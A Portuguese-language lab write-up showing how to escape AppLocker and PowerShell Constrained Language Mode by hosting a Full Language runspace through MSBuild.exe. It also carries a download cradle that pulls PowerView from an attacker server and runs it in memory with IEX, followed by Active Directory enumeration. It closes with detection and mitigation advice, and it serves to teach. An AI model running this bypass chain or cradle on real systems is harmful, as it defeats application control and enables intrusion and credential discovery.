Bypass de AppLocker e Constrained Language Mode

Uma estação de trabalho endurecida com AppLocker e PowerShell em Constrained Language Mode. O objetivo: recuperar o Full Language e carregar ferramentas de pós-exploração em memória, sem tocar o disco em diretório proibido.

// escopo
Pesquisa conduzida em laboratório próprio e isolado, sem qualquer relação com sistemas de produção ou ativos de terceiros. Fins estritamente educacionais. Aplicar estas técnicas em ambientes sem autorização prévia é ilegal.

Objetivo

O alvo é uma workstation Windows com duas camadas de contenção ativas: AppLocker, restringindo de onde binários e scripts podem ser executados, e o Constrained Language Mode (CLM) do PowerShell, que limita drasticamente o que a linguagem consegue fazer. A meta da pesquisa é carregar o PowerView para enumerar o Active Directory diretamente em memória — evitando escrever o script em disco, onde tanto o antivírus quanto o AppLocker o pegariam.

1. Reconhecimento do host

O primeiro passo é identificar a versão exata do Windows. Isso orienta o mapeamento de vulnerabilidades e de técnicas aplicáveis àquela build. 

systeminfo

2. O obstáculo: Constrained Language Mode

O plano inicial era instanciar um cliente HTTP para baixar e executar o PowerView em memória, um padrão clássico de download cradle: 

$browser = New-Object System.Net.WebClient

A tentativa falha. O PowerShell recusa a criação do objeto porque o modo de linguagem só permite os tipos básicos (core types):

Confirmando a hipótese, uma consulta ao modo de linguagem da sessão devolve ConstrainedLanguage: 

$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage

Em CLM, o PowerShell bloqueia New-Object para tipos arbitrários do .NET, chamadas diretas a métodos .NET, tipos Add-Type, COM e mais. É a contenção que a Microsoft acopla ao AppLocker/WDAC: mesmo com a shell aberta, o atacante fica sem as primitivas que a maioria das ferramentas ofensivas assume.

3. Entendendo as regras do AppLocker

Antes de tentar o bypass, é preciso saber de onde a política permite execução. As regras efetivas se leem direto pelo módulo do AppLocker: 

Import-Module AppLocker
$a = Get-AppLockerPolicy -Effective
$a.RuleCollections

O host roda as regras padrão: permite ao grupo Everyone executar o que estiver em %PROGRAMFILES% e em %WINDIR%. À primeira vista parece seguro — um usuário comum não escreve nesses diretórios. Na prática, essas duas árvores contêm subpastas graváveis por usuário e, principalmente, binários assinados pela Microsoft que executam código por nós (os chamados LOLBINs). É por aí que o bypass entra.

4. A ideia do bypass: um wrapper próprio de PowerShell

O ponto-chave é que o Constrained Language Mode é uma propriedade do host de PowerShell — não do motor em si. Boa parte das funcionalidades vem da biblioteca System.Management.Automation.dll, e essa DLL continua operando em Full Language mesmo quando a sessão interativa está em CLM.

A consequência é direta: se conseguirmos construir nosso próprio host — um wrapper que carrega System.Management.Automation.dll e cria um runspace novo — esse runspace tende a nascer em Full Language, devolvendo o PowerShell completo. E se esse wrapper for disparado por um binário que o AppLocker já confia (por exemplo, o MSBuild.exe, que está sob %WINDIR% e executa tarefas inline), as duas barreiras caem ao mesmo tempo: o AppLocker aprova o executável, e o runspace recém-criado escapa do CLM.

É a mesma família de técnicas catalogada no Ultimate AppLocker Bypass List e no psh.xml do How to Hack Like a Legend (referências abaixo): usar um LOLBIN confiável como porta de entrada para hospedar um runspace em Full Language.

5. Execução: MSBuild recuperando o Full Language

A prova de conceito é o psh.xml do How to Hack Like a Legend: um arquivo de projeto do MSBuild com uma inline task em C# que carrega System.Management.Automation.dll, cria um runspace e executa comandos de PowerShell. Para não esbarrar nas regras de script do AppLocker, o projeto é entregue com extensão .txt — o MSBuild aceita qualquer extensão, e MSBuild.exe vive sob %WINDIR%, portanto o AppLocker já o aprova. 

cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319
.\MSBuild.exe 'C:\Users\blancha.andrea\Downloads\dunga.txt'

A compilação inicia, a task roda os comandos de PowerShell e imprime FullLanguage. A hipótese se confirma: o runspace criado pelo nosso próprio host nasce sem as restrições do CLM, ainda que a sessão interativa que o disparou continue confinada.

Um segundo projeto — console.txt — vai além de executar comandos soltos: ele hospeda um console interativo em Full Language, o PowerShell Console Host Sample Application. É um shell completo dentro do processo confiável do MSBuild. 

.\MSBuild.exe 'C:\Users\blancha.andrea\Downloads\console.txt'

Dentro do wrapper, a mesma consulta que antes acusava CLM agora responde FullLanguage. As primitivas do .NET voltaram a estar disponíveis.

6. Carregando o PowerView em memória

Com o Full Language recuperado, o New-Object que falhara no início agora é aceito sem erro: 

$browser = New-Object System.Net.WebClient;

A partir daí, o download cradle clássico completa o plano: configura as credenciais de proxy, baixa o PowerView (aqui renomeado miniview.ps1) do servidor do atacante e o carrega direto na memória com IEX — sem nunca tocar o disco. 

$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('http://192.168.0.16:8000/miniview.ps1'));

7. Resultado: enumeração do Active Directory

Com o PowerView carregado, a enumeração do domínio flui normalmente. Um simples Get-NetUser já lista as contas — e revela um achado clássico de má configuração: uma senha deixada em texto claro no campo description de um usuário. 

Get-NetUser | select name, description

As duas camadas de contenção foram vencidas ao mesmo tempo: o AppLocker aprovou a execução porque a porta de entrada foi um LOLBIN confiável sob %WINDIR%, e o CLM foi contornado porque o runspace nasceu num host que criamos, e não no host interativo restrito.

8. Detecção e mitigação

Do lado defensivo, este cenário é bastante observável e endurecível:

  • WDAC no lugar (ou além) do AppLocker: política baseada em código com regras de DLL fecha boa parte dos LOLBINs que o AppLocker sozinho ignora.
  • Script Block Logging (evento 4104) e AMSI: a criação de um runspace e a importação de ferramentas ficam registradas mesmo quando a execução é em memória.
  • Bloquear ou auditar LOLBINs como MSBuild.exe, InstallUtil.exe e afins quando não houver necessidade legítima.
  • Revisar as regras padrão do AppLocker: as default rules confiam em árvores inteiras; o endurecimento real exige regras por publisher/hash e a remoção de subpastas graváveis por usuário sob os caminhos permitidos.
